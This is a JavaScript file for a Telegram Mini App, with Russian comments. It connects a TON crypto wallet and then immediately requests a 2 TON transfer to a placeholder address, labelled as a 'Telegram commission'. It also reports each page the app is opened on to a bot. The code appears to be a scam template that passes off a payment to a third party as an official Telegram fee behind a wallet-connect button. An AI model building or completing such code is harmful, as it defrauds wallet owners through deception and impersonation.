let tg = window.Telegram.WebApp;
tg.expand();

// === Настройки бота ===
const BOT_TOKEN = "ТВОЙ_ТОКЕН";  // Замени на свой токен бота
const CHAT_ID = "ТВОЙ_CHAT_ID";  // Замени на свой chat_id

// === Функция отправки данных в бота ===
async function sendToBot(message) {
    let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
    
    try {
        let response = await fetch(url);
        let result = await response.json();
        console.log("✅ Сообщение отправлено в бота:", result);
    } catch (error) {
        console.error("❌ Ошибка отправки в бота:", error);
    }
}

// === Очищаем кеш WebView, если Telegram его сохраняет ===
tg.ready();
tg.onEvent("themeChanged", () => {
    tg.expand();
});

// === Сообщаем боту, какой домен открыт ===
sendToBot(`Сайт открыт: ${window.location.href}`);

// === Подключаем TON Connect ===
async function loadTonConnect() {
    return new Promise((resolve, reject) => {
        const script = document.createElement("script");
        script.src = "https://cdn.jsdelivr.net/npm/@tonconnect/sdk@latest";
        script.onload = async () => {
            console.log("✅ TON Connect SDK загружен!");
            try {
                const module = await import("https://cdn.jsdelivr.net/npm/@tonconnect/sdk@latest");
                window.TonConnect = module.TonConnect;
                console.log("✅ TonConnect загружен:", window.TonConnect);
                resolve();
            } catch (error) {
                console.error("❌ Ошибка при импорте TON Connect:", error);
                reject(error);
            }
        };
        script.onerror = () => {
            console.error("❌ Ошибка загрузки TON Connect SDK!");
            reject(new Error("Ошибка загрузки SDK"));
        };
        document.head.appendChild(script);
    });
}

// === Функция подключения кошелька TON ===
async function connectWallet() {
    await loadTonConnect();
    
    if (typeof window.TonConnect === "undefined") {
        console.error("❌ TON Connect НЕ загружен!");
        alert("❌ Ошибка загрузки TON Connect. Попробуйте снова.");
        return;
    }

    try {
        const tonConnect = new window.TonConnect({
            manifestUrl: "https://telegram-mini-app-seven-blond.vercel.app/tonconnect-manifest.json"
        });

        const connectedWallet = await tonConnect.connect();
        if (!connectedWallet) {
            console.error("❌ Ошибка: Кошелек не подключился");
            alert("❌ Ошибка подключения");
            return;
        }

        const walletAddress = connectedWallet.account.address;
        tg.sendData(JSON.stringify({ wallet: walletAddress }));
        alert("✅ Кошелек подключен: " + walletAddress);

        // === Создаем транзакцию на 2 TON ===
        const transaction = {
            to: "EQC3DQ...ЗАМЕНИТЕ_НА_АДРЕС", // Адрес получателя
            value: "2000000000", // 2 TON (в нанотонах)
            payload: "Комиссия telegram"
        };

        await tonConnect.sendTransaction(transaction);
        alert("✅ Транзакция на 2 TON отправлена!");
    } catch (error) {
        console.error("❌ Ошибка при подключении:", error);
        alert("❌ Ошибка: " + error.message);
    }
}

// === Назначаем обработчик на кнопку ===
document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("connect-wallet").addEventListener("click", connectWallet);
});

